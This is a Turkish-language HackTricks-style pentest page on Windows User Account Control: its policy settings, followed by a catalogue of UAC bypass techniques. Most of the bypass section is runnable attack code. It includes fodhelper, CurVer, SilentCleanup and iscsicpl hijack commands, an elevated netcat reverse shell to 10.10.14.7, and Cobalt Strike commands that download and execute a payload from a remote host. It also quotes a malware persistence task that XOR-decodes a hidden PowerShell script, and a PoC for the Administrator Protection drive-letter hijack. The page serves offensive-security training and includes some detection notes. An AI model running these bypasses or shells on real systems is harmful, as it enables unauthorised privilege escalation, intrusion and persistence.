# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için bir onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviyeye** sahip bir program, **sistemin güvenliğini potansiyel olarak tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkinleştirildiğinde, bir yönetici bu uygulamaların/görevlerin çalışabilmesi için sisteme yönetici düzeyinde erişime sahip olmasını açıkça yetkilendirmediği sürece uygulamalar ve görevler her zaman **yönetici olmayan bir hesabın güvenlik bağlamında çalışır**. Bu, yöneticileri istenmeyen değişikliklere karşı koruyan bir kolaylık özelliğidir; ancak bir security boundary olarak kabul edilmez.<sup>[[2]](#references)</sup>

integrity seviyeleri hakkında daha fazla bilgi:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC kullanıldığında, bir yönetici kullanıcıya 2 token verilir: normal işlemleri medium integrity seviyesinde gerçekleştirmek için standart kullanıcı token'ı ve admin privileges içeren bir token.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), logon süreci, kullanıcı deneyimi ve UAC mimarisi de dahil olmak üzere UAC'nin nasıl çalıştığını ayrıntılı biçimde açıklar.<sup>[[2]](#references)</sup> Yöneticiler, UAC'nin nasıl çalışacağını kuruluşlarına özel olarak yerel düzeyde (secpol.msc kullanarak) yapılandırmak için security policies kullanabilir veya Active Directory domain ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak açıklanmıştır. UAC için ayarlanabilen 10 Group Policy ayarı vardır. Aşağıdaki tablo ek ayrıntılar sunar:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Yerleşik Administrator hesabı için Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Devre dışı)                                             |
| [User Account Control: Admin Approval Mode'daki yöneticiler için elevation prompt davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Secure desktop üzerindeki Windows dışı binary'ler için onay iste) |
| [User Account Control: Standart kullanıcılar için elevation prompt davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Secure desktop üzerinde credential iste)         |
| [User Account Control: Uygulama yüklemelerini algıla ve elevation iste](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Etkin; Enterprise'da varsayılan olarak devre dışı)           |
| [User Account Control: Yalnızca imzalanmış ve doğrulanmış executable'ları elevate et](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Devre dışı)                                             |
| [User Account Control: Yalnızca güvenli konumlara yüklenmiş UIAccess uygulamalarını elevate et](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Etkin)                                              |
| [User Account Control: Tüm yöneticileri Admin Approval Mode'da çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Etkin)                                              |
| [User Account Control: UIAccess uygulamalarının secure desktop kullanmadan elevation istemesine izin ver](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Devre dışı)                                             |
| [User Account Control: Elevation istenirken secure desktop'a geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Etkin)                                              |
| [User Account Control: Dosya ve registry yazma hatalarını kullanıcıya özel konumlara virtualize et](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Etkin)                                              |

### Windows'ta software yüklemeye yönelik policies

**local security policies** (çoğu sistemde "secpol.msc"), varsayılan olarak **admin olmayan kullanıcıların software yüklemesini engelleyecek** şekilde yapılandırılır. Bu, admin olmayan bir kullanıcı software'iniz için installer'ı indirebilse bile admin hesabı olmadan çalıştıramayacağı anlamına gelir.

### UAC'nin Elevation İstemesini Zorlamak için Registry Keys

Admin rights olmayan standart bir kullanıcı olarak, "standart" hesabın belirli işlemleri gerçekleştirmeye çalıştığında **UAC tarafından credential istenmesini** sağlayabilirsiniz. Bu işlem, bir **UAC bypass** mevcut olmadığı veya saldırgan zaten admin olarak logon olmadığı sürece, admin permissions gerektiren belirli **registry keys**'lerin değiştirilmesini gerektirir.

Kullanıcı **Administrators** grubunda olsa bile bu değişiklikler, administrative actions gerçekleştirmek için kullanıcıyı **hesap credentials'ını yeniden girmeye** zorlar.

**Pratikte bu yalnızca zaten elevated token'a, bir UAC bypass'a veya bu keys'leri değiştirmenize izin veren bir misconfiguration'a sahip olduğunuzda kullanışlıdır; aksi hâlde registry write işleminin kendisi engellenir.**

Değiştirmeniz gereken registry keys ve entries aşağıdadır (varsayılan değerleri parantez içinde verilmiştir):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Bu işlem Local Security Policy aracı üzerinden manuel olarak da yapılabilir. Değiştirildikten sonra administrative operations, kullanıcıdan credentials'ını yeniden girmesini ister.

### Note

**User Account Control bir security boundary değildir.** Bu nedenle standart kullanıcılar, local privilege escalation exploit'i olmadan hesaplarından çıkıp administrator rights elde edemez.

### Bir kullanıcıdan 'full computer access' istemek
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode, yüksek bütünlük düzeyine sahip işlemlerin (web tarayıcıları gibi) düşük bütünlük düzeyine sahip verilere (geçici Internet dosyaları klasörü gibi) erişmesini önlemek için bütünlük kontrollerini kullanır. Bu işlem, tarayıcının düşük bütünlük seviyesine sahip bir token ile çalıştırılmasıyla gerçekleştirilir. Tarayıcı düşük bütünlük bölgesinde depolanan verilere erişmeye çalıştığında işletim sistemi işlemin bütünlük seviyesini kontrol eder ve erişime buna göre izin verir. Bu özellik, remote code execution saldırılarının sistemdeki hassas verilere erişmesini önlemeye yardımcı olur.
- Bir kullanıcı Windows'ta oturum açtığında sistem, kullanıcının ayrıcalıklarının bir listesini içeren bir erişim token'ı oluşturur. Ayrıcalıklar, kullanıcının hakları ve yeteneklerinin birleşimi olarak tanımlanır. Token ayrıca kullanıcının kimlik bilgilerini de içerir; bunlar kullanıcının bilgisayarda ve ağdaki kaynaklarda kimliğini doğrulamak için kullanılan kimlik bilgileridir.

### Autoadminlogon

Windows'u başlangıçta belirli bir kullanıcıyla otomatik olarak oturum açacak şekilde yapılandırmak için **`AutoAdminLogon` registry key** değerini ayarlayın. Bu, kiosk ortamları veya test amaçları için kullanışlıdır. Parolayı registry içinde açığa çıkardığından bunu yalnızca güvenli sistemlerde kullanın.

Aşağıdaki key'leri Registry Editor veya `reg add` kullanarak ayarlayın:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Normal oturum açma davranışına geri dönmek için `AutoAdminLogon` değerini 0 olarak ayarlayın.

## UAC bypass

> [!TIP]
> Mağdura graphical access erişiminiz varsa UAC bypass oldukça kolaydır; UAC istemi göründüğünde "Yes" seçeneğine tıklamanız yeterlidir.

UAC bypass şu durumda gereklidir: **UAC etkin, işleminiz medium integrity context içinde çalışıyor ve kullanıcınız administrators grubuna ait.**

UAC en yüksek güvenlik seviyesindeyse (Always), diğer seviyelerden birindekine (Default) kıyasla **bypass edilmesinin çok daha zor** olduğunu belirtmek önemlidir.

### Medium-integrity shell üzerinden hızlı triage

Bir bypass denemeden önce doğru senaryoda olduğunuzu doğrulayın ve host build'ini bilinen çalışan yöntemlerle eşleştirin:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Pratik notlar:
- `EnableLUA=0` ise bir bypass kullanmanız gerekmez: herhangi bir admin token doğrudan high integrity isteğinde bulunabilir.
- `ConsentPromptBehaviorAdmin=2` veya `5`, auto-elevate / COM-based bypasses için yaygın senaryodur.
- `Always Notify` güvenlik çıtasını yükseltir, ancak başarısız olduğunu varsaymak yerine yine de tam build'i test etmelisiniz: UACME, modern Windows build'lerinde bazı `AlwaysNotify compatible` yöntemleri hâlâ takip etmektedir.<sup>[[3]](#references)</sup>

### UAC disabled

UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**), aşağıdakine benzer bir yöntem kullanarak **admin privileges ile bir reverse shell çalıştırabilirsiniz** (high integrity level):
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Token duplication ile UAC bypass

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Temel UAC "bypass" (tam dosya sistemi erişimi)

Administrators grubunda bulunan bir kullanıcı ile bir shell'iniz varsa, SMB üzerinden paylaşılan **C$**'ı yerel olarak yeni bir diske **mount** edebilir ve **dosya sistemindeki her şeye erişim** elde edebilirsiniz (Administrator home folder'ı dahil).

> [!WARNING]
> **Görünüşe göre bu yöntem artık çalışmıyor**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strike ile UAC bypass

Cobalt Strike teknikleri yalnızca UAC maksimum güvenlik seviyesine ayarlanmadığında çalışır.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit**, **UAC**'yi **bypass** etmek için çeşitli modüllere de sahiptir.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM nesneleri, modern build'lerde pratik bir UAC yüzeyi olmaya devam etmektedir. `ICMLuaUtil`, güncel Windows branch'lerinde çalıştığı UACME tarafından hâlâ takip edilmektedir ve offensive tooling, COM Elevation Moniker'ı çağırmadan önce interactive desktop process, 64-bit execution ve bazen PEB/process masquerading'i birleştirerek `CMSTPLUA`'yı uyarlamaya devam etmektedir.<sup>[[3]](#references)</sup>

Pratik ipuçları:
- Kullanıcının **interactive session**'ında çalışan bir **64-bit** process'i tercih edin (genellikle `explorer.exe` veya onun bir child process'i).
- Raw shell başarısız olursa, naif bir `CreateProcess` wrapper yerine bir BOF / UACME implementation üzerinden tekrar deneyin.
- Child execution'ın **ayrı bir elevated process** içinde gerçekleşmesini bekleyin; birçok BOF mevcut beacon'ı yerinde elevate etmez.

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), çeşitli UAC bypass exploits'lerinin bir **derlemesidir**. UACME'yi **Visual Studio veya msbuild kullanarak derlemeniz** gerektiğini unutmayın. Derleme, çeşitli executables oluşturacaktır (örneğin `Source\Akagi\outout\x64\Debug\Akagi.exe`); **hangisine ihtiyacınız olduğunu** bilmeniz gerekir.\
Dikkatli **olmalısınız**, çünkü bazı bypass'ler **kullanıcıya** bir şeyler olduğunu **uyaracak** başka programları **gösterebilir**.<sup>[[3]](#references)</sup>

UACME, her technique'in çalışmaya başladığı **build version** bilgisini içerir.<sup>[[3]](#references)</sup> Version'larınızı etkileyen bir technique arayabilirsiniz:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ayrıca, [bu](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfayı kullanarak build sürümlerinden Windows release `1607` değerini elde edebilirsiniz.

Pratik bir iş akışı, önce **host build'ini puanlamak**, ardından eşleşen yöntemi çalıştırmaktır:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage`, local build'i bilinen UAC yöntemleriyle hızlıca karşılaştırır; bu, işe yaramayan PoC'leri hızla elemek için kullanışlıdır.<sup>[[4]](#references)</sup>
- `UACME`, bir bypass yöntemini belirli bir build'e eşlemek için hâlâ en iyi public catalogue'dur. Recent releases, yeni yöntemler ekledi ve mevcut yöntemleri **Windows 11 25H2** üzerinde yeniden test etti; bu nedenle eski bir blog gönderisinin hâlâ değişiklik yapılmadan geçerli olduğunu varsaymadan önce README/release notes'u yeniden kontrol edin.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Trusted binary `fodhelper.exe`, modern Windows'ta auto-elevated durumdadır. Başlatıldığında, aşağıdaki per-user registry path'ini `DelegateExecute` verb'ünü doğrulamadan sorgular. Buraya bir command yerleştirmek, Administrators grubundaki bir kullanıcının Medium Integrity process'inin UAC prompt'u olmadan High Integrity process başlatmasını sağlar.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell adımları (payload'unuzu ayarlayın, ardından tetikleyin)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notlar:
- Mevcut kullanıcı Administrators üyesi olduğunda ve UAC seviyesi varsayılan/esnek olduğunda çalışır (ek kısıtlamalar içeren Always Notify durumunda çalışmaz).
- 64-bit Windows üzerinde 32-bit bir process'ten 64-bit PowerShell başlatmak için `sysnative` path'ini kullanın.
- Payload herhangi bir command olabilir (PowerShell, cmd veya bir EXE path'i). Stealth için prompt gösteren UI'lara izin vermeyin.

#### CurVer/extension hijack variant (yalnızca HKCU)

`fodhelper.exe` dosyasını abuse eden recent sample'lar `DelegateExecute` değerinden kaçınır ve bunun yerine per-user `CurVer` value'su üzerinden **`ms-settings` ProgID'sini redirect eder**. Auto-elevated binary handler'ı yine `HKCU` altında resolve ettiğinden, key'leri yerleştirmek için admin token gerekmez:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Yetki yükseltildikten sonra malware, `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` olarak ayarlayarak genellikle **gelecekteki istemleri devre dışı bırakır**, ardından ek defense evasion işlemleri gerçekleştirir (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) ve yüksek bütünlük düzeyinde çalışmak için persistence'ı yeniden oluşturur. Tipik bir persistence görevi, **XOR ile şifrelenmiş bir PowerShell scriptini** diskte saklar ve her saat bellekte decode edip çalıştırır:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Bu varyant yine dropper'ı temizler ve yalnızca staged payload'ları bırakır; bu nedenle detection, **`CurVer` hijack**'inin, `ConsentPromptBehaviorAdmin` tampering'inin, Defender exclusion oluşturulmasının veya PowerShell'i bellekte decrypt eden scheduled task'lerin izlenmesine dayanır.<sup>[[5]](#references)</sup>

### `SilentCleanup` task üzerinden UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup`, `cleanmgr.exe`'yi en yüksek ayrıcalıklarla başlatır ve `%windir%` değerini kullanıcı environment'ından genişletir. `HKCU\Environment\windir` değerini kontrol edebiliyorsanız, bu genişletmeyi arbitrary bir command'a yönlendirebilir ve bir consent dialog'u olmadan high integrity elde edebilirsiniz.<sup>[[8]](#references)</sup> UACME tekniği aktif tutmaya devam ettiğinden ve güncel issue tracking, Windows 11 24H2'nin yalnızca küçük quoting ayarlamaları gerektirebileceğini gösterdiğinden, bu yöntem güncel build'lerde hâlâ test edilmeye değerdir.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
If the task quotes the path on that build, retry with the payload ending in a quote (for example `cmd.exe"`). Always clean up `HKCU\Environment\windir` after testing.

#### Daha fazla UAC bypass

UI akışlarını, COM nesnelerini veya masaüstü etkileşimini abuse eden birçok classic UAC bypass, victim ile **full interactive session** gerektirir; yaygın bir `nc.exe` shell'i veya **Session 0** içinde çalışan bir service çoğu zaman yeterli değildir.

Bunu genellikle bir **meterpreter** session kullanarak çözebilirsiniz. **Session** değeri **1** olan bir **process**'e migrate edin:

![ms-settings'i custom bir extension (.thm) gösterecek ve bu extension'ı payload'ımıza map edecek şekilde ayarlayın - Daha fazla UAC bypass: Bir meterpreter session kullanarak elde edebilirsiniz. Session... değerine sahip bir process'e migrate edin...](<../../images/image (863).png>)

(_explorer.exe_ çalışmalıdır)

### GUI ile UAC Bypass

Bir **GUI** erişiminiz varsa, UAC prompt'u göründüğünde **kabul edebilirsiniz**; teknik bir bypass'a gerçekten ihtiyacınız yoktur. Bu nedenle bir GUI session elde etmek, UAC'nin eklediği pratik engeli aşmak için çoğu zaman yeterlidir.

Ayrıca birinin kullandığı bir GUI session elde ederseniz (potansiyel olarak RDP üzerinden), buradan **run** edebileceğiniz **cmd** gibi bazı **tools** **administrator** olarak çalışıyor olabilir; örneğin **admin** olarak doğrudan çalıştırabilir ve [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif) gibi UAC tarafından tekrar prompt gösterilmesini engelleyebilirsiniz. Bu biraz daha **stealthy** olabilir.

### Noisy brute-force UAC bypass

Noisy olmaktan endişe etmiyorsanız, kullanıcının kabul etmesine kadar permission'ları elevate etmeyi **ask** eden [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir şeyi her zaman **run** edebilirsiniz.

### Kendi bypass'ınız - Basic UAC bypass methodology

**UACME**'ye bakarsanız, **birçok UAC bypass'ın DLL hijacking'i abuse ettiğini** (genellikle elevated bir binary'ye writable bir path'ten attacker-controlled bir DLL load ettirerek) fark edersiniz. Bir DLL hijacking vulnerability'si bulmayı öğrenmek için [bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate** olacak bir binary bulun (çalıştırıldığında high integrity level ile çalıştığını kontrol edin).
2. Procmon ile **DLL Hijacking** için vulnerable olabilecek "**NAME NOT FOUND**" event'lerini bulun.
3. DLL'i bazı **protected paths** içine (C:\Windows\System32 gibi) **write** etmeniz gerekecektir; burada writing permission'ınız yoktur. Bunu şu yöntemleri kullanarak bypass edebilirsiniz:
1. **wusa.exe**: Windows 7,8 ve 8.1. Bu tool, high integrity level ile çalıştırıldığı için bir CAB file'ın içeriğini protected paths içine extract etmenize izin verir.
2. **IFileOperation**: Windows 10.
4. DLL'inizi protected path içine copy edecek ve vulnerable, autoelevated binary'yi execute edecek bir **script** hazırlayın.

### Başka bir UAC bypass tekniği

Bir **autoElevated binary**'nin **execute** edilecek bir **binary** veya **command**'in **name/path** bilgisini **registry**'den **read** etmeye çalışıp çalışmadığını izlemekten oluşur (binary bu bilgiyi **HKCU** içinde arıyorsa daha ilginçtir).

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack ile UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`, search order kullanarak `iscsiexe.dll` load etmesi için abuse edilebilen bir **auto-elevated** binary'dir. Malicious bir `iscsiexe.dll` dosyasını **user-writable** bir folder'a yerleştirebilir ve ardından current user'ın `PATH` değerini (örneğin `HKCU\Environment\Path` üzerinden) bu folder'ın aranacağı şekilde modify edebilirseniz, Windows attacker DLL'ini elevated `iscsicpl.exe` process'i içinde **UAC prompt göstermeden** load edebilir.<sup>[[1]](#references)[[6]](#references)</sup>

Practical notes:
- Bu, current user **Administrators** grubundaysa ancak UAC nedeniyle **Medium Integrity** ile çalışıyorsa kullanışlıdır.
- Bu bypass için ilgili olan kopya **SysWOW64** kopyasıdır. **System32** kopyasını ayrı bir binary olarak değerlendirin ve davranışını bağımsız olarak validate edin.
- Primitive, **auto-elevation** ile **DLL search-order hijacking** birleşimidir; bu nedenle diğer UAC bypass'larında kullanılan aynı ProcMon workflow'u, eksik DLL load'unu validate etmek için faydalıdır.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection fikirleri:
- `reg add` / registry writes işlemlerini `HKCU\Environment\Path` üzerine ve hemen ardından `C:\Windows\SysWOW64\iscsicpl.exe` çalıştırılmasını izleyin.
- `%TEMP%` veya `%LOCALAPPDATA%\Microsoft\WindowsApps` gibi **kullanıcı tarafından kontrol edilen** konumlarda `iscsiexe.dll` arayın.
- `iscsicpl.exe` başlatmalarını, beklenmeyen child process'ler veya normal Windows dizinleri dışından yapılan DLL yüklemeleriyle ilişkilendirin.

### Ayrı olarak incelenmeye değer daha yeni araştırmalar

2024 sonrası bazı chain'ler artık klasik `HKCU\Software\Classes` registry hijack'lerine benzemiyor. Örneğin activation-context cache poisoning, **drive remap** ve **DLL redirection** işlemlerini birleştirerek `ctfmon.exe` gibi trusted UI / auto-elevated binary'ler ve daha sonraki `fodhelper.exe` gibi target'lar üzerinden medium integrity'den high integrity'ye geçiş sağlayabilir. Büyük PoC'yi burada tekrarlamak yerine şu konumdaki kompakt payload örneklerini inceleyin:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Per-logon-session DOS device map üzerinden Administrator Protection (25H2) drive-letter hijack

Windows 11 25H2 üzerindeki kapsamlı `RAiLaunchAdminProcess` / UIAccess attack surface için özel sayfaya bakın:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection”, per-session `\Sessions\0\DosDevices/<LUID>` map'lerine sahip shadow-admin token'ları kullanır. Directory, ilk `\??` resolution işleminde `SeGetTokenDeviceMap` tarafından lazy olarak oluşturulur. Saldırgan shadow-admin token'ını yalnızca **SecurityIdentification** seviyesinde impersonate ederse directory, saldırganı **owner** olarak alarak oluşturulur (`CREATOR OWNER`'ı devralır); bu da `\GLOBAL??` önceliğine sahip drive-letter link'lerine olanak tanır.<sup>[[7]](#references)</sup>

**Adımlar:**

1. Düşük yetkili bir session'dan, prompt'suz bir shadow-admin `runonce.exe` başlatmak için `RAiProcessRunOnce` çağırın.
2. Primary token'ını bir **identification** token'ına duplicate edin ve `\Sessions\0\DosDevices/<LUID>` konumunun attacker ownership altında oluşturulmasını zorlamak için `\??` açılırken bu token'ı impersonate edin.
3. Burada attacker-controlled storage'a işaret eden bir `C:` symlink oluşturun; sonraki filesystem access işlemleri bu session'da `C:` yolunu attacker path'ine resolve ederek prompt olmadan DLL/file hijack yapılmasını sağlar.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Referanslar

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control nasıl çalışır](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass teknikleri koleksiyonu](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass uyumluluk tarayıcısı ve başlatıcısı](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI, PowerShell Backdoor'ları oluşturmak için AI kullanıyor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Güneydoğu Asya hükümeti hedeflerine karşı 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection'ı atlatma](https://projectzero.google/2026/26/windows-administrator-protection.html)
